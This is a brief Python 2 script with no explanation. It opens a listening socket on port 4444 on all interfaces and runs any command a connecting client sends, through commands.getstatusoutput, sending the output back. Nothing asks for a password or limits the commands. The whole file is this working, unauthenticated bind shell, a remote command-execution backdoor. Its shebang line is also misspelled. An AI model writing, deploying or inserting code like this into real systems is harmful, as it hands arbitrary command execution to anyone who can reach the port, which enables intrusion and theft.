#!/usr/bin/evn python
# -*- coding:utf-8 -*-

import threading
import signal
from socket import *
import commands
import sys

HOST = ""
PORT = 4444
ADDR = (HOST, PORT)
BUFLEN = 256
BAKLOG = 10


def server():
    listensock = socket(AF_INET, SOCK_STREAM)
    listensock.bind(ADDR)
    listensock.listen(BAKLOG)

    while True:
        clisock, addr = listensock.accept()
        t = ServeThread(clisock)
        t.start()

    listensock.close()

class ServeThread(threading.Thread):
    def __init__(self, sock):
        threading.Thread.__init__(self)
        self.sock = sock

    def run(self):
        cmd = self.sock.recv(BUFLEN)
        print "CMD:%s" % cmd
        output = commands.getstatusoutput(cmd)[1]
        self.sock.send(output)
        self.sock.close()
        sys.exit(0)


if __name__ == '__main__':
    server()


